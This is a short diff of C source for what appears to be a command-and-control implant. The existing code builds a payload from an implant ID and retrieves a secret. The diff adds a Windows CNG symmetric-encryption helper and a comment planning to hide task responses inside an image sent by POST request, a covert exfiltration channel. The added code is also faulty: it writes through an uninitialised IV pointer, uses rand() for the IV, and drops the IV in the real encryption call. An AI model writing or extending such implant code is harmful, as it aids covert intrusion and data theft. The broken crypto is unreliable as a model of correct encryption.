@@ -64,6 +64,22 @@ PUCHAR rsaEncrypt(BCRYPT_KEY_HANDLE rsakeyhandle, PUCHAR symkey, ULONG symkeysiz
     BCryptEncrypt(rsakeyhandle, symkey, symkeysize, NULL, NULL, 0, encbuffer, encbuffersize, &encbuffersize, 0);
     return encbuffer;
 }
+
+PUCHAR symkeyEncrypt(BCRYPT_ALG_HANDLE symkeyhandle,PUCHAR pbinput,ULONG pbinputsize){
+    ULONG encbuffersize;
+    PUCHAR iv;
+    for(int x=0;x<3;x++){
+        iv[x*4]=rand();
+    }
+    NTSTATUS status=BCryptEncrypt(symkeyhandle,pbinput,pbinputsize,NULL,iv,12,NULL,0,&encbuffersize,0);
+     PUCHAR encbuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, encbuffersize);
+    if (encbuffer == NULL)
+    {
+        printf("failed to allocate memory for blindedFEKBuffer\n");
+    }
+    BCryptEncrypt(symkeyhandle, pbinput, pbinputsize,NULL, NULL, 0, encbuffer, encbuffersize, &encbuffersize, 0);
+    return encbuffer;
+}
 char *getsecret()
 {
     char *secret = (char *)malloc(8);
@@ -405,6 +421,10 @@ char *make_base_payload(char *implant_id)
     strcat(payload, implant_id);
     return payloadptr;
 }
+
+
+//Respond to server:
+//task response data->Wrap in image->post request
 
 int main(int argc, char *argv[])
 {
